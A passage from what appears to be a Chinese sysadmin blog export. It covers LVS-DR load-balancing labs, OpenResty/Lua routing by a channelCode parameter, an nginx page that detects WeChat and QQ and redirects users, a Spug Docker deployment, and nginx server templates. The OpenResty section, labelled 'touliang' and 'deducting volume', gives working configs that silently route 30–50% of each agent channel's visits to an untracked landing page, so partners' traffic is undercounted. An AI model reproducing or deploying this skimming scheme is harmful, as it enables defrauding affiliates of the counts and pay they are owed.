server。也就是说，客户端192.168.2.x第一次访问了被调度给192.168.224.11:80，要等2＊60+10=130秒左右再做第二次访问才可能被调度给另一个real server. 测试结果总结:假设第一次访问web1,在一定的时间内都是访问web1（如果web1挂了，在此时间内仍然访问web1，时间过了，就会按rr算法访问web2了) 5, dh 目标地址散列,假如调度器的后面是两台缓存服务器A,B而不是真正的REALSERVER，则会尽可能的把相同请求或者把同一用户的请求转发到同一个缓存服务器上面以提高缓存命中率（类似nginx的url_hash算法) 123456789101112 客户端 client1 client2http:/xxxx/xxx/xxx.jpg lvs调度 squid1 squid2100 热点 冷点 web1 web2 123ipvsadm -E -t 192.168.2.59:80 -s dh ipvsadm -ln 6，sh 源地址散列算法.同一个源IP地址来的请求都会被调度到同一个realserver，保持会话一致（类似nginx的ip_hash算法)。但这样做，如果后台realserver挂掉，与它连接的所有会话会down掉。(建议使用持久性来做） 12345678910111213141516171819202122 客户端 LVS调度 web1 web2 firewall1 firewall2 lvs 内网客户端1 内网客户端2iptables (NEW established)外网客户端1 外网客户端2 lvs (sh算法, new,established) firewall1 firewall2 内网服务器 12ipvsadm -E -t 192.168.2.59:80 -s sh ipvsadm -ln lblc 在dh的基础上面考虑后台服务器的连接数（dh+lc)lblcr 在lblc的基础上，假设有A,B两台缓存服务器，某个用户第一次访问被重定向到A，第二次访问时A负载很大，B过于空闲这时也会打破原来的规则把客户的第二次访问重定向给B ======================================================================================= ARP协议(address resolve protocol)如:本机要 ping 192.168.224.12过程为:本机广播在局域网内 “谁是192.168.224.12，请把你的MAC告诉我”,只有192.168.224.12这个回应，并把它的MAC返回给本机。本机就得到了192.168.224.12的MAC，并把它存放到本地的MAC地址表中缓存（通过ip neigh或arp -a等命令查看得到），缓存时间在linux下默认为15分钟.在这15分钟内，如果本机再找192.168.224.12，就直接在缓存里去找。15分钟过了，缓存被清除了，再去找192.168.224.12，那么就重复上面的过程. 12345678[root@server ~]# arp -a? (192.168.224.1) at 00:50:56:c0:00:08 [ether] on ens33? (192.168.224.3) at 00:0c:29:97:e8:99 [ether] on ens37? (172.17.46.200) at 54:bf:64:50:44:20 [ether] on ens37? (172.17.46.195) at 54:bf:64:57:9c:b9 [ether] on ens37server2.com (192.168.224.12) at 00:0c:29:0e:0d:f9 [ether] on ens33gateway (172.17.46.254) at 92:d4:32:71:a9:45 [ether] on ens37server1.com (192.168.224.11) at 00:0c:29:97:e8:8f [ether] on ens33 123456789[root@server ~]# ip neigh192.168.224.1 dev ens33 lladdr 00:50:56:c0:00:08 DELAY192.168.224.3 dev ens37 lladdr 00:0c:29:97:e8:99 STALE172.17.46.200 dev ens37 lladdr 54:bf:64:50:44:20 STALE172.17.46.195 dev ens37 lladdr 54:bf:64:57:9c:b9 STALE192.168.224.12 dev ens33 lladdr 00:0c:29:0e:0d:f9 REACHABLE172.17.46.254 dev ens37 lladdr 92:d4:32:71:a9:45 REACHABLE192.168.224.11 dev ens33 lladdr 00:0c:29:97:e8:8f REACHABLE DNS ARP 域名或主机名 —&gt; IP —-&gt; MAC 张三的家 xx区xx站xx小区xx楼xxx室 =============================LVS-DR========================= LVS-DR 直接路由 （direct routing)与之前架构不同的地方在于： 请求发出的时候经过LVS director，但是返回的时候不经过lvs director 直接经过router出去，架构优势：减轻LVS director的压力。 12345678910111213141516 客户端-192.168.2.x （宿主机模拟) | | 192.168.2.59 [router或firewalld] 192.168.224.10 | |- - - - - - - - - - - - | | [lvs director] 192.168.224.13 | | | | |--------------------------| web1 web2 192.168.224.11 192.168.224.12 网关指向router的同网段IP 192.168.224.10 lo:0 192.168.224.13/32 lo:0 192.168.224.13/32 1，客户端请求sip:192.168.2.x dip:192.168.2.59smac:客户端MAC dmac:192.168.2.59的MAC在router上DNATsip:192.168.2.x dip:192.168.224.13192.168.2.59smac:客户端MAC dmac:192.168.224.13的mac 2,在director上调度（假设调给web1)数据包里的sip和dip不变，只把dmac变为web1的，然后调给web1sip:192.168.2.x dip:192.168.224.13smac:客户端MAC dmac:192.168.224.11的mac （注意这里IP与MAC不同） 3，数据包到web1后（因为是通过mac地址到的），这里又会有一个问题，web1收到这个包，但它并没有192.168.224.13这个IP，所以不会解析这个包如果在web1上虚拟192.168.224.13这个IP，那么它会与director的冲突所以解决方法为:在web1和web2上用lo:0来虚拟192.168.224.13这个IP，那么又可以响应解析调度过来的包，又可以互相不冲突 （因为lo:0为本地回环网卡，是不与其它人通信的） 4，请求到数据后，需要返回给客户端sip:192.168.224.13 dip:192.168.2.xsmac:192.168.224.11的mac dmac:客户端MAC 5，返回给192.168.2.x这个IP，但web1和web2并没有这个网段路由，所以把网关指向公司路由器的IP192.168.224.10（不能指director的192.168.224.13，因为DR-LVS回去时不通过director) ==================== 下面开始做实验。！！！最好准备干净的没有做过实验的虚拟机！！！ 机器配置：物理主机:192.168.2.xRouter: 192.168.2.59, 192.168.224.10 (Host:Server) (双网卡)LVS: 192.168.224.13 (Host: Client3)WEB1: 192.168.224.11 (Host: Client1)Web2: 192.168.224.12 (Host: Client2) 注意：本次实验使用192.168.224.10来作为LVS前端的路由器。所以Server的角色有所改变。本次实验需要绑定网卡，在命令行中网卡的名字要与实际一致。网卡MAC地址也要与实际一致。 第一大步:配置router #在10下执行1,打开ip_forward 1234vim /etc/sysctl.confnet.ipv4.ip_forward = 1或者：sed -i 10c'net.ipv4.ip_forward = 1' /etc/sysctl.conf #在第10行下面增加一行sysctl -p 使之生效 2,先清空原来的iptables所有规则,再在router上加上两条防火墙规则(我这里使用iptables做的，你也可以换成firewalld来做) 12345yum install iptables-services iptables -yiptables -F -t natiptables -F iptables -t nat -A PREROUTING -p tcp --dport 80 -i ens37 -j DNAT --to-destination 192.168.224.13 特别注意CentOS7中的网卡名字规范有所改变，不再叫ethx了。替换为实际的网卡名字。这条是表示从ens37网卡(也就是192.168.2.59的网卡)进来访问80的包,DNAT到192.168.224.13(也就是lvs调度器的IP) 1iptables -t nat -A POSTROUTING -p tcp --dport 80 -o ens33 -j SNAT --to-source 192.168.224.10 关于这一条（为了192.168.2.x访问192.168.2.59，变成192.168.224.10访问192.168.224.13)，这样可以实现LVS调度器能回客户端。如果你不用这条SNAT的话，也可以在LVS调度器上route add default gw 192.168.224.10指一个网关回去也可以,因为DNAT的目标机器需要一个网关才能回给client) 保存iptables规则 123iptables-save &gt; /etc/sysconfig/iptablessystemctl start iptables.servicesystemctl enable iptables.service 注意:设置好转发规则后，只能从外网的机器，以外网的IP进行访问转发端口。本地访问无效，因为转发规则中设置了进出网卡 第二大步:配置LVS调度器（在LVS上执行下面的步骤） 1yum install ipvsadm -y 如果是用lvs-nat做过的机器来做，先使用ipvsadm -C清空规则 2，配置调度规则。 使用rr轮询策略 123ipvsadm -A -t 192.168.224.13:80 -s rripvsadm -a -t 192.168.224.13:80 -r 192.168.224.11:80 -gipvsadm -a -t 192.168.224.13:80 -r 192.168.224.12:80 -g 这里的-g就是表示使用路由架构; LVS调度器就会把数据包调给192.168.224.11或192.168.224.12时,就只修改MAC地址,不修改目标IP直接路由过去 1234567ipvsadm -lnIP Virtual Server version 1.2.1 (size=4096)Prot LocalAddress:Port Scheduler Flags -&gt; RemoteAddress:Port Forward Weight ActiveConn InActConnTCP 192.168.224.13:80 rr -&gt; 192.168.224.11:80 Route 1 0 0 -&gt; 192.168.224.12:80 Route 1 0 0 123ipvsadm -Sn &gt; /etc/sysconfig/ipvsadmsystemctl start ipvsadmsystemctl enable ipvsadm 第三大步: 配置WEB服务器，以下操作在web1，web2上配置。配置后台的两个web(无论调度几个web,每个web服务器都要做下面的步骤) 1，安装httpd监听80端口，并使用两个不同的主页方便后面的测试(真实情况,后台的web可以使用共享存储来保证数据的一致性,这里是为了测试方便,才使用不同的主页)(安装步骤参考前边的HTTP安装以及创建网页)。配置完毕后，在Route和LVS服务器上分别访问web1和web2，确保网络配置没有问题。 web1: 1234yum -y install httpdsystemctl start httpdsystemctl enable httpdecho web1 &gt; /var/www/html/a.html web2: 1234yum -y install httpdsystemctl start httpdsystemctl enable httpdecho web2 &gt; /var/www/html/a.html curl 192.168.224.12/a.htmlcurl 192.168.224.11/a.html 2， 1ifconfig lo:0 192.168.224.13 netmask 255.255.255.255 注意掩码为4个255,想要永久生效，写一个ifcfg-lo:0的网卡配置文件就好了 永久生效： 12345vim /etc/sysconfig/network-scripts/ifcfg-lo.........IPADDR=192.168.224.13NETMASK=255.255.255.255......... systemctl restart network #这一步是非常重要的,因为路由方式扔过来的包,目标IP不变,也就是说还是192.168.224.13,只是通过找192.168.224.11或者192.168.224.12的MAC地址扔过来的;#所以web服务器上需要也需要有一个192.168.224.13这个IP来解析请求;用lo网卡来虚拟就是为了尽量不要与lvs的网卡造成ARP广播问题 问题:为什么netmask为4个255，而不是255.255.255.0；答案:如果为255.255.255.0，那么192.168.224.0/24整个网段都无法和web服务器通迅。而我们这里只要求lvs调度器和web不能通迅就可以了（后面使用arp -s绑定解决） 3, 真实服务器把默认路由指向router同物理网段的IP 1route add default gw 192.168.224.10 #想要永久生效，写到网卡配置文件 12345vim /etc/sysconfig/network-scripts/ifcfg-ens33 .........GATEWAY=192.168.224.10.........systemctl restart network #网关指向router的网卡,就是为了回去时跳过lvs调度器(提高调度器性能),直接回到router,再回给客户端(如果前面router上做了SNAT,那么这个网关可以不用加，原因可以直接分析数据包变化过程得到) 4, vim /etc/sysctl.conf #加上下面四句 1234net.ipv4.conf.lo.arp_ignore = 1 net.ipv4.conf.lo.arp_announce = 2net.ipv4.conf.all.arp_ignore = 1net.ipv4.conf.all.arp_announce = 2 sysctl -p 解释：arp_ignore = 1 表示系统只回答目的IP是本地的IP的包，也就是对广播包不做响应arp_announce = 2 表示系统忽略IP包的源地址，而根据目标主机选择地址 5， 12345678yum install arptables -y #安装arp防火墙对目标地址为192.168.224.13的包都drop掉arptables -A INPUT -d 192.168.224.13 -j DROP #添加这条规则。arptables-save -n &gt; /etc/sysconfig/arptablessystemctl start arptablessystemctl enable arptables 上面的第4和5小步都是用来解决DR架构中的arp问题;只需要用其中一个就可以了;当然两步都做也是可以的; 第四大步:一个重要的补充步骤1,回到lvs调度器上用ip neigh命令或者arp -a命令来查看是否有192.168.224.11或者192.168.224.12的物理地址;就算是有,也只是你刚才可能和它们通迅过,这些MAC地址还保存着(一般15分钟后就会消失),你需要再和192.168.224.11和192.168.224.12通迅; 但你会发现你都ping不通192.168.224.11和192.168.224.12了;原因是因为你在web服务器上配置了lo:0 192.168.224.13这个网卡所以LVS调度器192.168.224.13去ping 192.168.224.11 可以过去,但回不来,因为回来时他会直接找自己的lo:0的192.168.224.13 解决这个问题:在LVS调度器上永久绑定web1和web2的MAC地址(可以加入/etc/rc.local里永久生效) 12arp -s 192.168.224.11 00:0c:29:4e:51:b0arp -s 192.168.224.12 00:0c:29:0b:5c:5d 测试在客户端上curl 192.168.2.59/a.html测试注意：只能在外网客户机，以外网IP的方式进行访问。在网管机上无法访问 验证：在LVS上无法ping通 web1和web2，因为这两台机器具有和LVS相同的IP地址，所以无法回应icmp请求","link":"/2020/08/03/lvs-ipvsadm%E5%9B%9B%E5%B1%82%E6%95%88%E7%8E%87%E9%AB%98/"},{"title":"openresty结合lua对域名参数做负载均衡","text":"openresty结合lua对同一条域名判断参数做负载1，配置一条域名 ,当https://hudiecaifus.net/?channelCode=gg_34 这条域名后缀参数等于gg_34的时候转发http://meigui_34 123456789101112131415161718192021server { listen 80; server_name hudiecaifus.net www.hudiecaifus.net; root /software/mangguo站点/gg代理/hudiecaifus.net-no-cnzz; #默认不统计 location / { set_by_lua_block $gg_34 { local channel = { &quot;gg_34&quot; }; for k, v in pairs( channel ) do if ngx.var.arg_channelCode == v then return 1; end end return 0; } if ($gg_34) { proxy_pass http://meigui-gg_34; } }} 2， 再新建一个文件touliang_upstream.conf 每个落地页分别建2个server段。一个统计。一个不统计 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455upstream meigui-gg_34 { # 不扣 server 127.0.0.1:8804 weight=7; # 扣量 server 127.0.0.1:8805 weight=3;}server { listen 8804; server_name 127.0.0.1; root /software/mangguo站点/gg代理/hudiecaifus.net; location = /index.html { set_by_lua_block $date { return ngx.today(); } set_by_lua_block $c { if ngx.var.arg_channelCode ~= nil then return ngx.var.arg_channelCode; end return &quot;default&quot;; } set_by_lua_block $log_name { local name = ngx.var.date .. &quot;-&quot; .. ngx.var.c .. &quot;-cnzz&quot;; #访问生成对应的日志 return name; } access_log logs/$log_name.log; }}server { listen 8805; server_name 127.0.0.1; root /software/mangguo站点/gg代理/hudiecaifus.net-no-cnzz; #不统计落地页 location = /index.html { set_by_lua_block $date { return ngx.today(); } set_by_lua_block $c { if ngx.var.arg_channelCode ~= nil then return ngx.var.arg_channelCode; end return &quot;default&quot;; } set_by_lua_block $log_name { local name = ngx.var.date .. &quot;-&quot; .. ngx.var.c .. &quot;-no-cnzz&quot;; return name; } access_log logs/$log_name.log; }} 2.1, 优化后的配置文件，放在同一个目录下面，方便工作维护 新建touliang_xin.conf 123456789101112131415erver { listen 80; server_name aiktv.com www.aiktv.com ; root /software/nsvwang站点/nsvwang落地页1; location ~* (\\.html|/)$ { if ($arg_channelCode = 'nsw_1') { proxy_pass http://nsvwang-touliang-nsw_1; } if ($arg_channelCode = 'nsw_c1') { proxy_pass http://nsvwang-touliang-nsw_c1; } }} 再建一个touliang_upstram.conf 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061upstream nsvwang-touliang-nsw_1 { # 不扣 server 127.0.0.1:12001 weight=5; # 扣量 server 127.0.0.1:12002 weight=5;}server { listen 12001; server_name 127.0.0.1; root /software/nsvwang站点/nsvwang落地页1; location ~* (\\.html|/)$ { set_by_lua_block $date { return ngx.today(); } set_by_lua_block $c { if ngx.var.arg_channelCode ~= nil then return ngx.var.arg_channelCode; end return &quot;default&quot;; } set_by_lua_block $log_name { local name = ngx.var.date .. &quot;-&quot; .. ngx.var.c .. &quot;-op&quot;; return name; } access_log logs/$log_name.log; }}server { listen 12002; server_name 127.0.0.1; root /software/nsvwang站点/nsvwang落地页1; index no-op.html; location ~* (\\.html|/)$ { set_by_lua_block $date { return ngx.today(); } set_by_lua_block $c { if ngx.var.arg_channelCode ~= nil then return ngx.var.arg_channelCode; end return &quot;default&quot;; } set_by_lua_block $log_name { local name = ngx.var.date .. &quot;-&quot; .. ngx.var.c .. &quot;-touliang&quot;; return name; } access_log logs/$log_name.log; }} 3， 查看当天代理线的访问次数 123456789101112进入源服务器cd /etc/nginx/logs/cat 2022-03-12-gg_34-cnzz.log |wc -l83746 #表示gg_34代理线当天总访问83736次，走统计页面cat 2022-03-12-gg_34-no-cnzz.log |wc -l 36845#表示gg_34代理线当天总访问36845次，不走统计页面 4， 查看对应域名有多少代理线，或者查看代理线有哪些域名访问 123456789cat check.sh #!/bin/shif [ ! -z $1 ]; then grep $1 /etc/nginx/logs/access.log | awk '{ printf (&quot;%s --- %s\\n&quot;,$3,$5) }' | grep $1 | grep channelCode | sort | uniq -c | sort -n #grep $1 access.log-20220413 | awk '{ printf (&quot;%s --- %s\\n&quot;,$3,$5) }' | grep $1 | grep channelCode | sort | uniq -c | sort -nelse echo 参数为空fi 使用脚本 12345./check.sh woaktv.cc #参数1输入域名，就会统计出对应的代理线以及访问量./check.sh gg_34 #参数1输入代理线参数，就会统计出对应的域名以及访问量","link":"/2022/03/12/openresty%E7%BB%93%E5%90%88lua%E5%AF%B9%E5%90%8C%E4%B8%80%E6%9D%A1%E5%9F%9F%E5%90%8D%E5%88%A4%E6%96%AD%E5%8F%82%E6%95%B0%E5%81%9A%E8%B4%9F%E8%BD%BD/"},{"title":"nginx判断微信端跳转不同页面","text":"nginx判断微信端跳转不同页面一般视频分享链接，分享到微信或者QQ。如果不支持打开的话。就跳转到微信提示页面。通过其他浏览器打开。 配置文件nginx主配置文件http模块需要添加 12resolver 1.1.1.1 1.0.0.1 8.8.8.8 8.8.4.4 208.67.222.222 208.67.220.220 valid=60s; resolver_timeout 2s; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101server { listen 443 ssl http2; server_name www.wxfx.com; root /software/files/wxfx.com; default_type text/html; # SSL ssl_certificate /software/域名证书/wxfx.com/Nginx/wxfx.com.nginx.crt; ssl_certificate_key /software/域名证书/wxfx.com/Nginx/wxfx.com.key; include /software/站点配置文件/ssl_general; # index.html fallback location / { try_files $uri $uri/ /proc.html?u=$uri; } location = /wx.html {} location = /index.html {} location = /proc.html {} location = /qq.html {} location ~* \\.html$ { content_by_lua_block { --local ua = ngx.var.http_user_agent; --if string.find(string.lower(ua), &quot;weixin&quot;) then -- ngx.redirect(&quot;/wx.html&quot;); --elseif string.find(string.lower(ua), &quot;qqtheme&quot;) then -- ngx.redirect(&quot;/qq.html&quot;); --else ngx.exit(404); --end } } location /test { content_by_lua_block { if not ngx.var.arg_u then ngx.redirect(&quot;/&quot;); end local http = require &quot;resty.http&quot;; local httpc = http.new(); local res, err = httpc:request_uri(&quot;http://www.spgetaway.com/videosite/short-link/getShortLink2/&quot;..ngx.var.arg_u, {}); if not res then ngx.say(err); end if 200 ~= res.status then ngx.exit(res.status); end local json = require(&quot;cjson.safe&quot;); local t = json.decode(res.body); if not t or t.data == json.null or not t.data.longs then ngx.exit(404); end #分享跳转后的地址 ngx.redirect(&quot;https://www.www-wxsp.app/?&quot;..t.data.longs); } } # favicon.ico location = /favicon.ico { log_not_found off; access_log off; } # robots.txt location = /robots.txt { log_not_found off; access_log off; } # assets, media location ~* \\.(?:css(\\.map)?|js(\\.map)?|jpe?g|png|gif|ico|cur|heic|webp|tiff?|mp3|m4a|aac|ogg|midi?|wav|mp4|mov|webm|mpe?g|avi|ogv|flv|wmv)$ { expires 7d; access_log off; }}# non-www, subdomains redirectserver { listen 443 ssl http2; server_name .wxfx.com; # SSL ssl_certificate /software/域名证书/wxfx.com/Nginx/wxfx.com.nginx.crt; ssl_certificate_key /software/域名证书/wxfx.com/Nginx/wxfx.com.key; return 301 https://www.wxfx.com$request_uri;}# HTTP redirectserver { listen 80; server_name .wxfx.com; return 301 https://www.wxfx.com$request_uri;} 家目录对应的文件 12ls /software/files/wxfx.com/index.html proc.html qq.html wx.html index.html 1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset='utf-8'&gt; &lt;meta http-equiv='X-UA-Compatible' content='IE=edge'&gt; &lt;title&gt;Page Title&lt;/title&gt; &lt;meta name='viewport' content='width=device-width, initial-scale=1'&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; proc.html 12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset='utf-8'&gt; &lt;meta http-equiv='X-UA-Compatible' content='IE=edge'&gt; &lt;title&gt;Page Title&lt;/title&gt; &lt;meta name='viewport' content='width=device-width, initial-scale=1'&gt; &lt;script&gt; var ua = window.navigator.userAgent.toLowerCase(); let s = window.location.pathname.split(&quot;/&quot;); if (s.length &gt; 0) { if (-1 != ua.indexOf(&quot;weixin&quot;) || -1 != ua.indexOf(&quot;micromessenger&quot;)) { window.location.href = &quot;/wx.html?u=&quot; + s[1]; } else if (-1 != ua.indexOf(&quot;qqtheme&quot;)) { window.location.href = &quot;/qq.html?u=&quot; + s[1]; } else { window.location.href = &quot;/test?u=&quot; + s[1]; } } &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;center&gt; &lt;h2&gt;正在处理...&lt;/h2&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt; qq.html 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; function getQueryVariable(variable) { var query = window.location.search.substring(1); var vars = query.split(&quot;&amp;&quot;); for (var i = 0; i &lt; vars.length; i++) { var pair = vars[i].split(&quot;=&quot;); if (pair[0] == variable) { return pair[1]; } } return (false); } &lt;/script&gt; &lt;script&gt; var ua = window.navigator.userAgent.toLowerCase(); if (-1 == ua.indexOf(&quot;qqtheme&quot;)) { let u = getQueryVariable('u'); if (u) { window.location.href = u; } else { window.location.href = &quot;/index.html&quot;; } } &lt;/script&gt; &lt;style&gt; .center { padding: 0 20px } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1 align=&quot;right&quot;&gt;👆&lt;/h1&gt; &lt;div class=&quot;center&quot;&gt; &lt;h2&gt; &lt;font color=&quot;red&quot;&gt;提示&lt;/font&gt;&lt;br&gt;手机QQ中无法直接打开&lt;br&gt;请点击页面右上角，在&lt;font color=&quot;red&quot;&gt;浏览器&lt;/font&gt;中访问 &lt;/h2&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; wx.html 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; function getQueryVariable(variable) { var query = window.location.search.substring(1); var vars = query.split(&quot;&amp;&quot;); for (var i = 0; i &lt; vars.length; i++) { var pair = vars[i].split(&quot;=&quot;); if (pair[0] == variable) { return pair[1]; } } return (false); } &lt;/script&gt; &lt;script&gt; var ua = window.navigator.userAgent.toLowerCase(); if (-1 == ua.indexOf(&quot;micromessenger&quot;) || -1 == ua.indexOf(&quot;weixin&quot;)) { let u = getQueryVariable('u'); if (u) { window.location.href = u; } else { window.location.href = &quot;/index.html&quot;; } } &lt;/script&gt; &lt;style&gt; .center { padding: 0 20px } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1 align=&quot;right&quot;&gt;👆&lt;/h1&gt; &lt;div class=&quot;center&quot;&gt; &lt;h2&gt; &lt;font color=&quot;red&quot;&gt;提示&lt;/font&gt;&lt;br&gt;微信中无法直接打开&lt;br&gt;请点击页面右上角，在&lt;font color=&quot;red&quot;&gt;浏览器&lt;/font&gt;中访问 &lt;/h2&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;","link":"/2021/07/31/nginx%E5%88%A4%E6%96%AD%E5%BE%AE%E4%BF%A1%E7%AB%AF%E8%B7%B3%E8%BD%AC%E4%B8%8D%E5%90%8C%E9%A1%B5%E9%9D%A2/"},{"title":"docker部署openspug检测","text":"openspug检测 openspug.yml 1234567891011121314151617181920version: &quot;3&quot;services: open-spug: image: openspug/spug container_name: spug hostname: spug networks: - spugnetwork volumes: - &quot;spugdata:/data&quot; ports: - &quot;9898:80&quot;networks: spugnetwork:volumes: spugdata: driver: local-persist driver_opts: mountpoint: /root/openspug/data/ 启动后设置用户信息 12345#进入容器 设定用户密码 以下为 admin spug.dev 账号密码docker exec $CONTAINER_ID init_spug admin spug.dev #执行完毕重启容器 docker restart $CONTAINER_ID 1234#如果容器重启了 导致监控不更新$ cd /data/spug/spug_api$ source venv/bin/activate$ python manage.py runmonitor","link":"/2020/08/04/openspug%E6%A3%80%E6%B5%8B/"},{"title":"nginx_server段常用配置模板","text":"一，常规简单的1, 配置域名可以正常访问80端口1234567server { listen 80; server_name wohenliu.com www.wohenliu.com; root /software/web目录/wohenliu.com; index index.html index.htm; charset utf-8;} 2，配置域名正常访问80端口自动跳转443端口家目录(有几种方式参考)这种需要提前申请ssl证书 第一种 12345678910111213141516171819server { listen 80; listen 443 ssl; server_name wohenliu.com www.wohenliu.com; root /software/web家目录/wohenliu.com; index index.html index.htm; charset utf-8; # HSTS add_header Strict-Transport-Security &quot;max-age=31536000&quot;; add_header X-Frame-Options deny; add_header X-XSS-Protection &quot;1&quot;; ssl_certificate_key /etc/nginx/conf/域名证书/wohenliu.com/Nginx/wohenliu.com.key; ssl_certificate /etc/nginx/conf/域名证书/wohenliu.com/Nginx/wohenliu.com.nginx.crt; if ($scheme = http ) { return 301 https://$host$request_uri; }} 第二种 1234567891011121314151617181920server { listen 80; server_name wohenliu.com www.wohenliu.com; return 301 https://$host$request_uri;} server { listen 443 ssl http2; server_name wohenliu.com www.wohenliu.com; root /software/web家目录/wohenliu.com; index index.html index.htm; charset utf-8; # HSTS add_header Strict-Transport-Security &quot;max-age=31536000&quot;; add_header X-Frame-Options deny; add_header X-XSS-Protection &quot;1&quot;; ssl_certificate_key /etc/nginx/conf/域名证书/wohenliu.com/Nginx/wohenliu.com.key; ssl_certificate /etc/nginx/conf/域名证书/wohenliu.com/Nginx/wohenliu.com.nginx.crt;} 3,配置域名直接跳转到其他域名不设置自己的家目录同样有多种方式 第一种 12345678910111213141516server { listen 80; listen 443 ssl; server_name wohenliu.com www.wohenliu.com; add_header Strict-Transport-Security &quot;max-age=15768000; includeSubDomains&quot; always; charset utf-8; if ($scheme = http ) { return 301 https://$host$request_uri; } return 301 https://baidu.com:2019$request_uri; ssl_certificate_key /etc/nginx/conf/域名证书/wohenliu.com/Nginx/wohenliu.com.key; ssl_certificate /etc/nginx/conf/域名证书/wohenliu.com/Nginx/wohenliu.com.nginx.crt;} 4,配置域名通过自己家目录html跳转12345678910111213141516171819server { listen 80; listen 443 ssl; server_name wohenliu.com www.wohenliu.com; root /software/web家目录/wohenliu.com; index index.html index.htm; charset utf-8; # HSTS add_header Strict-Transport-Security &quot;max-age=31536000&quot;; add_header X-Frame-Options deny; add_header X-XSS-Protection &quot;1&quot;; ssl_certificate_key /etc/nginx/conf/域名证书/wohenliu.com/Nginx/wohenliu.com.key; ssl_certificate /etc/nginx/conf/域名证书/wohenliu.com/Nginx/wohenliu.com.nginx.crt; if ($scheme = http ) { return 301 https://$host$request_uri; }} 和上面一样，只是需要增加html代码内容 二，需要统计代理线参数的location配置1, 不同的域名使用同样的家目录后面增加共享名参数80端口12345678910111213server { listen 80; server_name wohenliu.com; charset utf-8; root /software/web家目录/wohenliu.com; index index.html; location =/ { if ($arg_shareName = &quot;&quot;){ rewrite ^ http://$host/index.html?shareName=qptg9 break; } }} 这段代表如果只要本条域名共享名为空的话，就会跳转访问家目录且后面的参数是qptg9 2，域名跳转其他域名且后面跟对应的参数和设置默认的跳转123456789101112131415161718server { listen 80; listen 443 ssl; server_name wohenliu.com www.wohenliu.com; # HSTS add_header Strict-Transport-Security &quot;max-age=31536000&quot;; add_header X-Frame-Options deny; add_header X-XSS-Protection &quot;1&quot;; ssl_certificate_key /etc/nginx/conf/域名证书/wohenliu.com/Nginx/wohenliu.com.key; ssl_certificate /etc/nginx/conf/域名证书/wohenliu.com/Nginx/wohenliu.com.nginx.crt; if ($arg_channelCode != &quot;&quot;) { rewrite ^/(.*) https://www.qita.com/$1 break; } rewrite ^/(.*) https://www.qita.com/?channelCode=1020 break;} 这种只要输入域名，就会跳转其他域名，且默认跳后面参数为channelCode=1020, brak代表停止执行后面的rewrite指令集 3，设置匹配到域名后面的参数就跳转不同的家目录12345678910111213141516171819202122232425server { listen 80; listen 443 ssl; server_name wohenliu.com www.wohenliu.com; root /software/web家目录/wohenliu.com; charset utf-8; index index.html; if ($server_port = 80 ) { return 301 https://$host$request_uri; } location / { if ($arg_shareName = gdx26) { root /software/web家目录/wohenliu.com_gdx26; } if ($arg_shareName = gdx27) { root /software/web家目录/wohenliu.com_gdx27; } if ($arg_shareName = gdx28) { root /software/web家目录/wohenliu.com_gdx28; } } ssl_certificate_key /etc/nginx/conf/域名证书/wohenliu.com/Nginx/wohenliu.com.key; ssl_certificate /etc/nginx/conf/域名证书/wohenliu.com/Nginx/wohenliu.com.nginx.crt;} 这种只要输入域名时后面加入其他指定参数就会跳转到对应的家目录 4, 配置？后面的固定参数访问指定家目录，同时指定跳转指定参数，同时其他参数也可以访问123456789101112131415161718192021222324252627282930313233server { listen 80; listen 443 ssl; server_name wohenliu.com www.wohenliu.com; # HSTS add_header Strict-Transport-Security &quot;max-age=31536000&quot;; add_header X-Frame-Options deny; add_header X-XSS-Protection &quot;1&quot;; ssl_certificate_key /etc/nginx/conf/域名证书/wohenliu.com/Nginx/wohenliu.com.key; ssl_certificate /etc/nginx/conf/域名证书/wohenliu.com/Nginx/wohenliu.com.nginx.crt; if ($server_port = 80 ) { return 301 https://$host$request_uri; } location / { if ($arg_channelCode = 10028) { root /software/web家目录/wohenliu.com ; } } if ($arg_channelCode = &quot;&quot;) { rewrite ^/(.*) https://www.qitayuming.com/?channelCode=1005 break; } if ($arg_channelCode != &quot;10028&quot;) { rewrite ^/(.*) https://www.qitayuming.com/$1 break;}} 这种家目录也可以指定跳转其他域名并获取后面的参数字符串 相关html代码 123456789101112131415161718&lt;html&gt;&lt;head&gt;&lt;title&gt;正在跳转&lt;/title&gt;&lt;meta http-equiv=&quot;Content-Language&quot; content=&quot;zh-CN&quot;&gt;&lt;meta HTTP-EQUIV=&quot;Content-Type&quot; CONTENT=&quot;text/html; charset=gb2312&quot;&gt;&lt;!-- &lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=https://www.cq88xz.com/&quot;&gt; --&gt;&lt;script&gt; var argsStr = location.search; var oMeta = document.createElement('meta'); oMeta.httpEquiv = 'refresh'; oMeta.content = '1;url=https://www.qitayuming.com/'+argsStr; document.getElementsByTagName('head')[0].appendChild(oMeta);&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 5, location 配置轮询访问访问 woheliu.com就会跳自己的家目录，访问www.wohenliu.com 就会跳转到webzu轮询 